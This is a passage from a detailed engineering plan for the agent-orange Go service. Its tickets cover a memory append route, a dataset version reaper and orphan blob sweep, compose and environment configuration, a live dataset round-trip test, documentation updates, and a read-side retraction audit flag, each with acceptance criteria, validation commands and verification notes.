    >1MB is `400` regardless.
  - `501` when the memory store is not Postgres, matching the read routes.
  - No config event is written.
  - The response is the stored row read back, in `memoryRecordResp` shape.
- **TDD:** yes.
- **Validation:**
  - `cd go && go test ./httpapi/... -run 'TestMemor' -count=1`
  - `cd go && go build ./... && go vet ./...`
- **Depends on:** —
- [x] done
- Notes: **Implemented and verified 2026-08-20.** Branch `O7-memory-append-route`, commit
  `41e69fc` (905 insertions across `go/httpapi/memories.go`, `memories_test.go`, `httpapi.go`,
  `go/cmd/agentd/sessionsecret_test.go`). Passed adversarial verification **first time, zero fix
  rounds** — all eleven criteria PASS with evidence, including the two that were most likely to be
  met in letter only: the session-token rejection is asserted at **401 from the real middleware**
  (`sessionsecret_test.go:59-78` drives a genuinely minted `sid` token through `apiAuthMiddleware`),
  and the embed-token rejection uses the literal discriminator `if id.SessionScope != ""`
  (`memories.go:408`) before body decode or any store call. "No config event is written" was proven
  live, not assumed: `TestMemoryAppendRoute_LivePG` counts `config_events` before and after a real
  append and fails on any delta. The doc comment at `httpapi.go:84` was updated, not left lying.
  Executor decision the plan did not specify: the success status is **`201 Created`** — see
  **R36**; W2/W5/W8/W9/W10 must expect 201. A `project` key in the body is ignored rather than
  refused (the criterion reads both ways). Note **R42**: this branch also contains O1's commit.

### O8: Dataset reaper, orphan sweep, compose and project map   [Status: done | Model: sonnet]
- **Scope:** Run the dataset **version reaper** and the **orphan blob sweep** on their own ticker
  **inside `cmd/agentd`**, started from `main.go` after the store is built and cancelled on
  shutdown — and make every credential and knob this integration needs actually reach `agentd`.
  "Beside the snapshot reaper" in revision 3 pointed at a place O8 may not touch: that reaper is a
  Runner loop (`go/snapshot_reaper.go`) driven by `agentkit.Policy.SnapshotReapInterval`, which
  agentd merely sets (`main.go:323`). Datasets are product-layer and Postgres-only, so the loop
  stays in agentd and `go/agentkit.go` / `go/runner.go` are **not** touched. Test-name prefixes are
  pinned: new parsing cases extend `TestResolveGCConfig`, new boot-log cases extend
  `TestGCConfigBootLines`, the loop and sweep are `TestDatasetReap…`, and the project-map example is
  `TestProjectMapExample`.
- **Repo:** agent-orange
- **Files:** create `go/cmd/agentd/datasetreaper.go`, `go/cmd/agentd/datasetreaper_test.go`; modify
  `go/cmd/agentd/gc.go`, `go/cmd/agentd/gc_test.go` (the two new knobs and their boot lines, beside
  the two existing ones), `go/cmd/agentd/googleauth_test.go` (the `.env.example` parse test),
  `go/cmd/agentd/main.go` (start the loop), `docker-compose.yml`, `.env.example`.
- **Acceptance criteria:**
  - `AGENTKIT_DATASET_REAP_INTERVAL` (default `6h`) is parsed by the **existing** `parseGCDuration`
    (`go/cmd/agentd/gc.go:110`), so `off|0|none|never|disabled` mean never sweep and the
    `[1m, 30d]` bounds apply unchanged.
  - **`AGENTKIT_DATASET_KEEP_VERSIONS` (default `30`) is an integer count, not a duration, and no
    existing helper can parse it.** `parseGCDuration` rejects a bare `30` outright
    (`time.ParseDuration` does), and the "bounds helpers" revision 3 referred to do not exist. Add
    `parseKeepVersions(name, raw string, def int) (int, error)` beside it: empty → the default; a
    non-integer → a boot error naming the variable; a negative → a boot error; `0` means **keep
    everything**, matching O3's `keepPerName <= 0` criterion, and is logged as such; the maximum is
    10000. Getting this wrong in the other direction — treating `0` as a disabling word, the
    meaning `gcDisabledWords` gives it for the interval — deletes every non-current version of every
    dataset on the first sweep, so the `0` case has its own test.
  - The boot log names both variables in `describeReapInterval`'s style (`gc.go:147`), including a
    `DISABLED (no DATABASE_URL)` line — datasets are Postgres-only, exactly like the snapshot
    reaper's `wired` argument.
  - **The orphan sweep runs on the same ticker as the version reaper**, and not at all when the
    interval is disabled. Each pass: `store.ReapDatasetVersions(ctx, keep, blobs)`, then
    `orphans, err := store.ListOrphanBlobPaths(ctx, blobs, time.Hour)` and a `Delete` for each
    returned path — with **`strings.HasPrefix(p, agentdb.DatasetBlobPrefix)` re-asserted
    immediately before every `Delete`**. That re-assertion is belt and braces on purpose: agentd
    runs **one global `BlobStore`** shared with `_artifacts/bytes/` and with snapshot bytes
    (`newBlobs` → `Global("")`, `go/cmd/agentd/backends.go:59-76`), so a wrong or empty prefix
    would enumerate and delete every artifact and snapshot blob in the deployment. The `1h` minimum
    age is what stops the sweep eating a pull that has written its bytes but not yet its row.
  - A `Delete` failure is logged and the pass continues. Every pass logs one line:
    `datasets: reaped N versions, swept M orphan blobs (F delete failures)`.
  - **The sweep has its own tests, because half this ticket's scope had none in revision 3** — an
    executor who shipped the version reaper and no sweep at all passed every criterion. Using a
    fake `extension.BlobStore` and a fake store: (a) a path with the `_artifacts/bytes/` prefix is
    **never** deleted even when the fake store reports it orphaned; (b) a zero interval starts no
    ticker; (c) the loop returns on context cancel; (d) a `Delete` error does not abort the pass.
  - `docker-compose.yml`'s `agentd` service gains **one explicit line per variable**, because
    compose forwards only what it names (its own comment at `:166-169`): `WOLF_API_KEY`,
    `WOLF_MCP_TOKEN`, `AGENTKIT_DATASET_REAP_INTERVAL`, `AGENTKIT_DATASET_KEEP_VERSIONS` and
    `AGENTKIT_DATASET_MAX_BYTES` (O6b's cap — no other ticket forwards it, so without this line an
    operator setting it in `.env` gets the 64MiB default and no warning). Each in the `${VAR:-}`
    form used by `AGENTKIT_SNAPSHOT_REAP_INTERVAL` at `:134`. `AGENTKIT_MCP_ENV` is **already**
    forwarded at `:165`; nothing to add for it.
  - `.env.example` gains a commented line for each of those five, beside the existing
    `AGENTKIT_SNAPSHOT_REAP_INTERVAL` at `:149`, and sets `AGENTKIT_MCP_ENV=WOLF_MCP_TOKEN` in its
    worked example.
  - **`.env.example` carries a worked `AGENTKIT_PROJECT_MAP` in object form, exactly this:**
    ```
    AGENTKIT_PROJECT_MAP={"users":{"you@example.com":["wolf"]},"projects":{"wolf":
    {"api_key_env":"WOLF_API_KEY","allowed_origins":["http://localhost:8081"]}}}
    ```
    (one line in the file; wrapped here only to fit). `users` is **not** optional — the object form
    fails boot with `project map: empty (neither users nor projects)` when both halves are empty
    (`go/cmd/agentd/googleauth.go:149-152`). The origin is wolf-web's published port
    (`WOLF_WEB_PORT`, default 8081, W1) and carries **no trailing slash and no path**:
    `validateOrigin` (`googleauth.go:187-207`) rejects a path, query, fragment or userinfo, and
    allows plain `http` only for `localhost` / `127.0.0.1` / `::1`. Without an `allowed_origins`
    entry the embed page's CSP is the union of configured origins and **an unlisted origin cannot
    frame it at all** (`go/cmd/agentd/embedcsp.go`); with no map at all it is
    `frame-ancestors 'none'`.
  - **`TestProjectMapExample` parses that line rather than trusting it.** It reads the
    `AGENTKIT_PROJECT_MAP=` line out of `../../.env.example`, strips the leading `# `, and feeds it
    to `parseProjectSettings` (`googleauth.go:73`), asserting no error and that the `wolf` project
    resolves `api_key_env=WOLF_API_KEY` with the one origin. Without it, this ticket both authors
    `.env.example` and is graded on `.env.example`, and a map that would kill agentd at boot ships
    green (the **R41** shape).
- **TDD:** yes for the two knobs, the boot lines, the sweep and the project-map example; no for the
  compose and `.env.example` prose itself.
- **Validation:**
  - `cd go && go test ./cmd/agentd/... -run 'TestResolveGCConfig|TestGCConfig|TestDatasetReap|TestProjectMapExample' -count=1 -v`
    — the pattern is spelled out because `-run` is an **unanchored substring** and `-run 'TestGC'`
    does not match `TestResolveGCConfig`, which is exactly where the natural implementation puts its
    new cases. Confirm a `--- PASS` line for `TestResolveGCConfig`, `TestGCConfigBootLines`,
    every `TestDatasetReap*` and `TestProjectMapExample`, and **zero `--- SKIP`**.
  - `dcc | grep -E 'WOLF_API_KEY|WOLF_MCP_TOKEN|AGENTKIT_MCP_ENV|AGENTKIT_DATASET_'` prints all
    **six** under the `agentd` service — `dcc` is the redacted wrapper defined in § "Executor
    orientation". Do **not** run the bare `docker compose config` here: grep prints whole lines, so
    the unredacted form discloses `WOLF_API_KEY`'s and `WOLF_MCP_TOKEN`'s values to stdout
    (**R82**).
  - `cd go && go build ./... && go vet ./...`
- **Depends on:** O3 *(the version reaper, `ListOrphanBlobPaths` and `agentdb.DatasetBlobPrefix` are
  all O3's deliverables). Strictly serial with O6b on `go/cmd/agentd/main.go`, in either order;
  `AGENTKIT_DATASET_MAX_BYTES` is O6b's knob and this ticket only forwards its name.*
- [x] done — verified 2026-08-21, 18/18 criteria, zero fix rounds
- Notes: **Implemented and independently verified 2026-08-21 — 18 of 18 criteria PASS, zero fix
  rounds.** Branch `O8-dataset-reaper-compose`, commit `8851d8a`, merged to `main`. Reaper and
  orphan sweep run on one ticker in `datasetreaper.go`, started from `main.go` beside the
  router/scheduler/attention sweep and only when `agentDB != nil`. The two knobs deliberately
  differ in what `0` means and the boot log says so: `AGENTKIT_DATASET_REAP_INTERVAL` reuses
  `parseGCDuration` (so `off|0|none|never|disabled` and the `[1m,720h]` bounds apply unchanged),
  while `AGENTKIT_DATASET_KEEP_VERSIONS` is a new `parseKeepVersions` where **`0` means keep
  EVERYTHING** — the opposite. `TestGCConfigBootLines` asserts the keep-versions=0 line contains
  "every" and never "DISABLED", which is the line that stops an operator reading one knob's `0`
  through the other's meaning. **O3's inert `minAge` is handled at the caller**, per R47: a blob
  path must be reported orphaned on **two** sweeps at least 1h apart before deletion, and a path
  that stops being reported is forgotten rather than deleted later on stale evidence.
  `agentdb.DatasetBlobPrefix` is re-asserted immediately before **every** delete, and a test proves
  an `_artifacts/bytes/` path reported as orphaned is never deleted. Compose forwards all six
  variables into `agentd`; `.env.example` documents five plus a worked object-form
  `AGENTKIT_PROJECT_MAP`, which `TestProjectMapExample` **parses out of the file itself** rather
  than trusting the prose. R82 held: the Validation ran through the `dcc` redactor and no value was
  printed. Two minor defects accepted, both for O10 (**R97**): the worked `AGENTKIT_MCP_ENV` value
  sits in an *indented* prose comment while the column-0 declaration line is still empty, so an
  operator who uncomments the wrong one gets an empty allowlist and `WOLF_MCP_TOKEN` silently never
  reaches a session container; and `TestProjectMapExample` asserts the wolf origin *validates* but
  never that it equals `http://localhost:8081`, so a typo'd port would keep the test green while
  the embed CSP refuses to frame wolf-web. 10 guesses. Found **R96**.
### O9: Dataset round-trip integration test   [Status: done | Model: opus]
- **Scope:** The only test that exercises the `Exec` + `cat` pull and the `?token=` download against
  a **real container**. Everything under it is unit-tested with fakes; this is the single place
  where a `download_url` built on the wrong base, a shell-quoting bug, a mis-scoped token or a
  byte-mangling read actually shows up. There is exactly one test function and it is named
  `TestDatasetRoundTripLive`.
- **Repo:** agent-orange
- **Files:** create `go/cmd/agentd/datasets_roundtrip_test.go` — package `main`, behind
  `//go:build integration`. **Not `go/systemtest/`, and that is a correction rather than a
  preference:** the three tools live in `package main`, which Go cannot import, and the systemtest
  rig is a *library* rig over `agentkittest.MemStore` + `artifacts.MockArtifactStore`
  (`go/systemtest/helpers_test.go:60-90`) with no `agentdb.Store`, no Postgres, no `httpapi` mux
  and no `/mcp` server — while its `TestMain` (`go/systemtest/system_test.go:56-79`) shells out to
  `docker build ../../sandbox` and `os.Exit(1)`s on failure instead of skipping.
- **Harness — what the test stands up, stated because no ticket built it and O9 cannot assume it:**
  - A real `*agentdb.Store` from `AGENTKIT_TEST_POSTGRES_URL` (§ "The throwaway Postgres").
  - An `httptest.Server` mounting O5's four dataset routes **through the same
    `apiAuthMiddleware` the stack mounts** (`go/cmd/agentd/main.go:589`), over that store and over
    the same `extension.BlobStore` the tools write to. Its listener address is what is handed to
    the dataset tools as `selfURL`, so `download_url` points at it.
  - One real container, from an image that contains `curl`, reachable **from the container to the
    listener**. The straightforward configuration is `execenv/docker`'s `Socket` adapter with
    `Network: "host"` (`go/execenv/docker/socket.go:32-35`), so the container reaches the listener
    at `127.0.0.1:<port>`; a DinD environment addressed at its bridge gateway is equally
    acceptable. If `Provision`'s health probe cannot be satisfied under the chosen network mode,
    stand the container up directly and implement `execenv.ExecutionEnvironment` minimally over it
    — `go/systemtest/testenv_test.go` is the worked precedent for exactly that (real Docker,
    `--network host`, labelled for cleanup) and may be **copied**, not imported: it is a `_test.go`
    in another package.
  - **The first assertion in the test is a reachability pre-flight**, not the round trip: the
    harness mux registers a trivial `/__ping` route, and the test execs
    `curl -fsS -o /dev/null -w '%{http_code}' <selfURL>/__ping` inside the container and
    `t.Fatalf`s with the URL when it is not `200`. Without it an unreachable listener surfaces as a
    baffling byte-comparison failure nine lines later.
  - **Two guards, because the two prerequisites can be absent independently:** `t.Skip` naming
    `AGENTKIT_TEST_POSTGRES_URL` when it is unset, and `t.Skip` naming Docker when a client ping
    fails. Do **not** model this on `go/systemtest`'s `testing.Short()` skips — that is a flag
    check, not a Docker probe, and it does not skip when Docker is simply absent.
- **Acceptance criteria:**
  - **Byte fidelity.** Write a payload containing a NUL byte, a non-ASCII run (`£ é 中`) and both
    LF and CRLF sequences into `/workspace`, `dataset_put` it as `application/octet-stream`,
    `dataset_get`, `curl` the URL to a file **from inside the container**, and assert the file is
    **byte-identical** to what was written and that its sha256 matches the tool result's.
  - **The canonical CSV round-trips.** A second dataset written as `text/csv` in the exact format of
    § "The canonical dataset CSV" (header `timestamp,value`, RFC3339 UTC, ascending, LF, no
    trailing blank line) reports `row_count == max(0, N-1)`, equal to the number of data rows
    written.
  - **The curl uses `download_url` verbatim** — no rewriting of host, scheme or port. This is what
    proves O6b's `AGENTKIT_SELF_URL` requirement: a URL built on `AGENTKIT_PUBLIC_BASE_URL` would
    be unreachable here for exactly the reason it is unreachable in the compose stack.
  - **The download carries no `X-API-Key` and no `Authorization` header.** The `?token=` leg is the
    only unauthenticated-at-the-middleware path in the tree (O5, owner decision **B1**), and the
    request must travel through the real middleware — a test that calls the bare handler proves
    nothing about the route an agent actually curls.
  - A second `dataset_put` at a **stale** `if_version` fails with an error naming the current
    version, and a following `dataset_get` returns the version, `size_bytes` and `sha256`
    **unchanged**.
  - A replacement whose `row_count` is below 50% of the current version's is refused without
    `allow_shrink` — with both counts named in the message — and accepted with it.
  - A `dataset_get` token minted for dataset A does not download dataset B: `404`, not `403`
    (O5's non-oracle rule).
  - **Cleanup is asserted, not hoped for.** The container is destroyed, and every dataset row and
    blob the test created is removed; a teardown error fails the test loudly rather than leaking a
    container and a host port into the next run.
- **TDD:** no (the integration test is the deliverable).
- **Validation:**
  - `cd go && AGENTKIT_TEST_POSTGRES_URL=<see § "The throwaway Postgres"> go test -tags integration ./cmd/agentd/... -run 'TestDatasetRoundTripLive' -count=1 -v -timeout 600s`
    — **`-tags integration` is not optional.** Without it the file is not compiled, the pattern
    matches nothing and the run exits **0**, which is the vacuous pass this ticket exists to
    prevent. The `-v` output must show `--- PASS: TestDatasetRoundTripLive`; a `--- SKIP` means a
    prerequisite was missing and the ticket is **unproven**, not passing.
  - `cd go && go build ./... && go vet ./... && go vet -tags integration ./cmd/agentd/...` — the
    second vet is what typechecks the tagged file, which the ordinary gates never compile.
- **Depends on:** O5, O6b *(O6b brings O5 transitively, but O5 is named because this test drives
  O5's download route through the middleware directly — without that stated, the ticket reads as
  if it only needed the tools)*
- [x] done
- Notes: **Wave 6, 2026-08-21 — passed 8/8 after one fix round.** `5698703`, one file, 821 lines, no
  production code touched. The verifier found one **blocking** defect the implementer's own report had
  graded a pass: the cross-dataset-token probe swapped only the dataset NAME onto a URL still carrying
  the minted `?version=2`, and the target dataset only ever reaches version 1 — so the asserted 404 came
  from the version lookup and `httpapi.DownloadDataset`'s `DatasetScope` pin was never consulted. It was
  proved by **deleting that check outright and watching the whole test stay green**. The fix strips
  `?version=` (absent means "current version"), adds a positive control so the 404 cannot be blamed on
  dropping the parameter, and makes `swapDatasetName` fatal if handed a version-pinned URL so the trap
  cannot come back silently. Five criteria are now mutation-proved. Re-run by the orchestrator on merged
  `main`: `--- PASS: TestDatasetRoundTripLive (4.00s)`, zero leaked containers.

### O10: Document datasets and the memory append route   [Status: pending | Model: sonnet]
- **Scope:** `docs/20-datasets.md`, plus the cross-references that keep the existing docs true —
  including the three claims O7, O11 and O6b leave stale in `docs/19-embedding.md`, which become
  live lies the moment those branches merge (R44). Docs only; no Go change, no test change.
- **Repo:** agent-orange
- **Files:** create `docs/20-datasets.md`; modify `docs/19-embedding.md` (§ 7's read-only claim,
  § 10's route table, § 10's environment-variable table, hazard **H12**),
  `docs/18-workers-memory-events.md` (§ 6's core-tools table), `CLAUDE.md` (the `docs/` repo-map
  row and the status block). All four files carry at least one criterion below — none may be left
  untouched, which is how two of them were silently skippable before.
- **Acceptance criteria:**
  - `docs/20-datasets.md` covers, each under its own heading: **the atom** (project-scoped, named,
    versioned, labelled blob; "current" is the highest version for `(project, name)`); **CAS**,
    mandatory on every write, with `if_version = 0` meaning "must not exist" and a conflict
    naming the current version; **the two byte paths** — `Exec` + `cat` pull on write,
    short-TTL scoped `download_url` on read — and why each was chosen over the rejected
    alternatives in § "The dataset atom"; **the canonical CSV** (`timestamp,value`, RFC3339 in
    UTC, ascending, LF, one metric per dataset) and `row_count = max(0, N-1)`; **the shrink
    guard** (a replacement below 50% of the current `row_count` is refused without
    `allow_shrink`); **retention, the orphan sweep and `agentdb.DatasetBlobPrefix`**
    (`_datasets/bytes/`), with the warning that agentd runs one global `BlobStore` shared with
    `_artifacts/bytes/` and snapshots, so an enumeration under the wrong prefix would sweep every
    artifact and snapshot blob in the deployment.
  - **Exactly these three environment variables are named, each with its default and its effect:**
    `AGENTKIT_DATASET_MAX_BYTES` (64MiB, O6b), `AGENTKIT_DATASET_REAP_INTERVAL` (6h, `0` means
    never sweep, O8), `AGENTKIT_DATASET_KEEP_VERSIONS` (30, O8). The Wolf-specific variables
    (`WOLF_API_KEY`, `WOLF_MCP_TOKEN`, `AGENTKIT_MCP_ENV`) belong to O8's `.env.example` and are
    explicitly **out of scope here** — say so in one line rather than documenting them twice.
    *(This replaces "every new env var", which named no list and no baseline for "new": one
    executor documented three, another six, and a verifier diffing `.env.example` failed the
    first.)*
  - States plainly that **bytes never need to cross the model's context** *and* both caveats: the
    `download_url` carries a bearer token which DOES enter the tool result, the model context, the
    persisted transcript, the SSE stream and every `worker.finished` subscriber; and nothing
    prevents a model reading a downloaded file into its own context itself. The guarantee is "the
    plan never *requires* bytes in context", not "bytes can never appear there".
  - The **trust rule** is documented as the intended mechanism for an embedder holding
    authoritative state: provenance is server-stamped from the credential's class and cannot be
    supplied by the caller, so empty provenance means server-written; anything written from inside
    a container carries a worker name or a session id and is advisory. The section also states the
    two hazards an embedder must handle — `ApplyTopology` is a second producer of empty
    provenance, and a retraction is not provenance-checked by `notRetractedSQL`, which is what
    `?include_retracted=1` exists for.
  - `docs/19-embedding.md` § 7's bullet **"Read-only. There is no HTTP write or delete"** is
    replaced with the append route's contract: `POST /agent/memories`, key or JWT only, **201
    Created**, provenance stamped empty and a body supplying it rejected `400`, `embed` defaults
    true, >24KB with `embed: true` is `400`, hard ceiling 1MB, `501` off Postgres, no config
    event. It also documents `GET /agent/memories?include_retracted=1` (O11) and its `403` for a
    session-scoped credential.
  - `docs/19-embedding.md` § 10's route table gains **five rows** — the four dataset routes of
    § "Dataset HTTP routes" and `POST /agent/memories` — each with its auth column; and § 10's
    environment-variable table gains the three dataset variables above.
  - `docs/19-embedding.md`'s **hazard H12** ("the session-token secret and the API secret are the
    same value") no longer describes this code and is rewritten: the two credential classes are
    signed with different secrets (`go/cmd/agentd/sessionsecret.go`) and the API middleware
    independently rejects any token carrying a non-empty `sid` with **401**
    (`go/cmd/agentd/auth.go`, the `sid` lock, "doc 22, RD30"). This is O7's delegated fix (R28)
    and it was previously assigned to O10 only by a parenthetical inside O7's criteria.
  - `docs/18-workers-memory-events.md` § 6's core-tools table gains a **Datasets** row listing
    `dataset_list`, `dataset_get` and `dataset_put`, each with its one-line contract and the
    "metadata and URLs only, never bytes in a tool result" note.
  - `CLAUDE.md`'s `docs/` repo-map row names `20-datasets` in its numbered list, and the status
    block gains one sentence for the dataset atom and one for `POST /agent/memories`.
- **TDD:** no (docs).
- **Validation** — each command has a stated expected output; run from the repo root. Docs-only
  tickets have no test to hide behind, so these are the whole gate:
  ```sh
  # 1. Every route the new doc names is a route that exists. Must print NOTHING.
  for r in "GET /agent/datasets" "GET /agent/datasets/{name}/versions" \
           "GET /agent/datasets/{name}/download" "POST /agent/memories"; do
    grep -qF "$r" docs/20-datasets.md && grep -qF "$r" go/httpapi/httpapi.go || echo "MISSING $r"
  done
  # 2. The three env vars are named. Must print three lines, all >0.
  for v in AGENTKIT_DATASET_MAX_BYTES AGENTKIT_DATASET_REAP_INTERVAL \
           AGENTKIT_DATASET_KEEP_VERSIONS; do echo "$v $(grep -c "$v" docs/20-datasets.md)"; done
  # 3. The stale read-only claim is gone. Must print nothing and exit 1.
  grep -n 'There is no HTTP write' docs/19-embedding.md
  # 4. The append route reached § 10's route table and § 7. Must hit at least twice.
  grep -c 'POST /agent/memories' docs/19-embedding.md
  # 5. H12 was rewritten, not left standing. Must hit both.
  sed -n '/^### H12/,/^### H13/p' docs/19-embedding.md | grep -cE 'sessionsecret.go|401'
  # 6. The core-tools table gained the three tools. Must print 3.
  grep -cE 'dataset_list|dataset_get|dataset_put' docs/18-workers-memory-events.md
  # 7. CLAUDE.md points at the new doc. Must hit.
  grep -c '20-datasets' CLAUDE.md
  ```
- **Depends on:** O7, O8, O9, O11 — **all four are load-bearing, not courtesy**. O8 owns the two
  reaper variables and their defaults, so scheduling O10 before O8 documents names that are still
  unwritten; O11 owns `?include_retracted=1`, which no other ticket documents and which § 10's
  table must carry; O9 is what proves the round trip the doc describes; O7 is the route itself.
- [ ] done
- Notes:

### O11: Make retraction visible to a trusted reader   [Status: done | Model: opus]
- **Scope:** Add `include_retracted=1` to `GET /agent/memories`, and return **every** retraction of
  a retracted row alongside it — each with its own provenance — so a caller holding project
  authority can tell "this was withdrawn, by a worker" apart from "this does not exist". Without
  it, an untrusted session can erase Wolf's authoritative state and nothing can detect it — see
  § "The trust model" → "Retraction". Three things this ticket must get right that an earlier
  draft got wrong:
  - **The type is `agentdb.MemorySearchQuery`** (`go/agentdb/memories.go:83`), not `MemoryQuery`.
    The plan's § "File Structure" row repeats the wrong name; the code wins.
  - **All retractions, not the newest** (owner decision B5). Returning only the newest lets an
    attacker append their own retraction on top of Wolf's, have it discarded as untrusted, and
    thereby *resurrect* state Wolf had legitimately withdrawn.
  - **The retractor lookup is store-side.** `go/httpapi` writes no SQL, and the lookup is one
    additional query for the whole result page, never one per row.
  Test names are pinned in the criteria below so the Validation filters and the code agree —
  `go test -run` is an unanchored substring match, and the house naming convention puts every
  existing regression test for this exact function outside the old filter.
- **Repo:** agent-orange
- **Files:** modify `go/agentdb/memories.go`, `go/agentdb/memories_test.go`,
  `go/agentdb/memories_retraction_live_test.go` (the live retraction cases live here and are the
  regression gate — new live cases go beside them, not in a new file),
  `go/httpapi/memories.go`, `go/httpapi/memories_test.go`, `go/httpapi/httpapi.go`,
  `go/cmd/agentd/mcp_memory_test.go` (one added case; the tool itself does not change).
- **Acceptance criteria:**
  - `agentdb.MemorySearchQuery` gains `IncludeRetracted bool`. When false — **the default, and
    every existing caller** — `notRetractedSQL("f")` is applied at `SearchMemories` exactly as
    today. A test asserts existing behaviour is byte-identical when the flag is absent, and every
    existing caller compiles unchanged.
  - **`IncludeRetracted` is a property of the HARD filter**, the same clause that governs the
    recency leg, both relevance legs and the `latest_per` pre-reduction (see the comment at
    `SearchMemories`). So when it is true, a retracted row participates in the `latest_per`
    reduction and can win its name's slot. **A paired test asserts both halves:**
    `latest_per=name&include_retracted=1` returns the retracted row (carrying `retracted_by`), and
    the same query without the flag returns the older row beneath it. This pair is the contract
    W5's tamper detection is written against; leaving it unstated lets two competent executors
    ship two different responses to the same request with no failing test.
  - `agentdb.MemorySearchResult` (`go/agentdb/memories.go:113`) gains
    `RetractedBy []MemoryRetraction \`json:"retracted_by,omitempty"\`` with
    `MemoryRetraction{ MemoryID, CreatedByWorker, CreatedBySession string; CreatedAt int64 }`,
    `CreatedAt` commented as unix **milliseconds** (the unit `memories` is stamped in). Rows that
    are not retracted omit the field entirely.
  - **`RetractedBy` carries EVERY retraction of that row, newest first** — not the newest one
    (B5). A test appends two retractions to the same memory, one with empty provenance and one
    from a session, and asserts both are returned. This is what lets a trusted reader ask "does
    *any* retraction of this row have empty provenance?": with only the newest, an attacker
    appends their own on top, the reader discards it as untrusted, and state that was legitimately
    withdrawn comes back.
  - Exposed as `?include_retracted=1` on `GET /agent/memories`. Absence means false; **any other
    value — including `0`, `true` and the empty string — is `400`** naming the parameter.
  - **Available to project API keys and console JWTs only.** The discriminator is
    **`Identity.SessionScope != ""`** — i.e. an **embed token**, which is API-class and DOES reach
    this handler (hazard H1) — and it gets **`403`**, checked before the query is built. A real
    session token never reaches the handler at all: it is signed with a separate secret
    (`go/cmd/agentd/sessionsecret.go`) and the middleware rejects any non-empty `sid` claim with
    **401** (`go/cmd/agentd/auth.go`, the `sid` lock). Assert **401 at the real middleware** for
    that case, exactly as O7 does in `go/cmd/agentd/sessionsecret_test.go`. Do not attempt to
    construct a session token that reaches this handler; it cannot be done, and trying is the
    round O7 had to pre-correct (R28).
  - **`NewestMemory`, `GET /agent/memories/current`, `GetMemory` and `GET /agent/memories/{id}`
    are all unchanged**, each asserted by a test. Briefings must keep honouring retraction; this
    flag is a read-side audit facility, not a new default. `GetMemory` was already deliberately
    unfiltered and does not gain `retracted_by`.
  - **The `memory_search` MCP tool does NOT gain the argument.** An actor who can retract must not
    be able to inspect the audit view, and the MCP surface is authenticated by exactly that actor's
    session token. A case beside `TestMemoryToolsSearchSchemaAdmitsNarrowingArgs`
    (`go/cmd/agentd/mcp_memory_test.go`) asserts `include_retracted` is absent from the tool's
    input schema.
  - The doc comment above `notRetractedSQL` — the one explaining that `GetMemory` is deliberately
    unfiltered — is extended to name this flag as the search-side equivalent, and to say that it
    returns all retractions rather than the newest, with B5's reason.
  - **Test names are pinned so the Validation filters match them.** New `agentdb` cases are named
    `TestRetractionLivePG_…` (matching `TestRetraction`, `Live` and `TestRetractionLivePG`
    alike); new `httpapi` cases are named `TestListMemories_IncludeRetracted…`. A test written in
    the file's obvious style but under a name none of the filters match is a ticket failure, not a
    style preference — that is how a regression in retraction filtering would pass all three
    commands below.
- **TDD:** yes.
- **Validation** — the first two are the cheap gate; the two live runs are the only ones that can
  execute the criteria, because every retraction case is live-Postgres only and skips silently
  without the URL:
  - `cd go && go build ./... && go vet ./...`
  - `cd go && go test ./agentdb/... -run 'TestMemor|TestRetraction' -count=1` — compiles and runs
    the sqlite-safe cases; the retraction cases SKIP here, which is expected and proves nothing
  - `cd go && go test ./cmd/agentd/... -run 'TestMemoryTools' -count=1`
  - `AGENTKIT_TEST_POSTGRES_URL=<see § "The throwaway Postgres"> go test ./agentdb/... \
    -run 'TestMemor|TestRetraction' -count=1` — must exit 0. Then re-run with `-v` and
    `| grep -E '^--- (PASS|SKIP|FAIL)'`: the four existing `TestRetraction*` cases
    (`go/agentdb/memories_retraction_live_test.go`) plus every new `TestRetractionLivePG_*` case
    must show `--- PASS`, and there must be **zero `--- SKIP` lines**. `-run 'TestMemor'` alone
    matches none of those four — they are the only tests that pin `notRetractedSQL`, the exact
    function this ticket edits
  - `AGENTKIT_TEST_POSTGRES_URL=<same> go test ./httpapi/... -run 'TestMemor|TestListMemories' \
    -count=1` — must exit 0. Then re-run with `-v | grep -E '^--- (PASS|SKIP|FAIL)'` and confirm
    **zero `--- SKIP` lines**. `GET /agent/memories` is served by `ListMemories`, and its six
    existing `TestListMemories_*` cases are not matched by `TestMemor`
- **Depends on:** O7 *(shares `go/httpapi/memories.go` and `go/httpapi/httpapi.go`; strictly
  serial, and O7's `MemoryStore` seam and 201 append are already in place)*
- [x] done
- Notes: **Delivered on branch `O11-include-retracted`, commit `0a3fd9d`, based on
  `O7-memory-append-route` (which already carries O1; neither is merged to `main`). One fix round.**
  Orchestrator re-ran the Validation on 2026-08-21: build+vet clean, the `agentdb` live run and the
  `httpapi` live run each show **zero `--- SKIP`**, and every `TestListMemories_IncludeRetracted*`
  and `TestRetractionLivePG_*` case passes.
  **The fix round was entirely in the tests, not the implementation.** Three live cases decided
  their assertions by the order two back-to-back inserts happened to land in: `CreateMemory` stamps
  `time.Now().UnixMilli()` when `CreatedAt` is zero, so both rows shared a millisecond and
  `ORDER BY created_at DESC, id DESC` fell through to a random UUID — the "newest first" half of B5
  failed roughly one run in four. All three now seed explicit `base` / `base+1000` / `base+2000`
  timestamps (the pattern `agentdb/memories_live_test.go:161` already uses) and the httpapi case
  uses a uuid-suffixed project so a run killed mid-test cannot poison the next one. See **R60** —
  the same latent flake exists elsewhere in the package and was not swept.
  Contract notes for W5, which is written against this: in the B5 two-retraction test the
  **application's** empty-provenance retraction is the *older* one and the attacker's
  session-provenanced retraction is the *newer*, so `RetractedBy[0]` is the attacker's — that is the
  ordering that models the resurrection attack the criterion exists to defeat.
  Surprises logged: **R59** (the ticket's own Validation list never reaches its 401 criterion,
  because `-run 'TestMemoryTools'` is an unanchored substring that misses
  `TestSessionTokenIsRejected*`; the orchestrator ran the corrected filter — exit 0 — and the fixed
  command is recorded in R59), **R60** and **R61**.

---

### W1: Wolf repo scaffold and local topology   [Status: done — F1/F2/F3 closed by W1b, 2026-08-21 | Model: sonnet]
- **Scope:** Create the repository with `api/` (Node + TypeScript + vitest) and `web/` (React 18 +
  MUI 6 + Vite + vitest), and the compose topology from § "Local topology and networking" — which
  is not negotiable, because a `wolf-api` on the ordinary compose network is unreachable from
  session containers.
- **Repo:** agent-wolf
- **Files:** `package.json` (workspaces), `tsconfig.base.json`, `api/`, `web/`,
  `docker-compose.yml`, `.env.example`, `README.md`, `.gitignore`.
- **Acceptance criteria:**
  - `wolf-api` uses `network_mode: "container:${ORANGE_DIND_CONTAINER}"` (default
    `agent-orange-dind-1`), so it shares DinD's namespace: it reaches agentd at
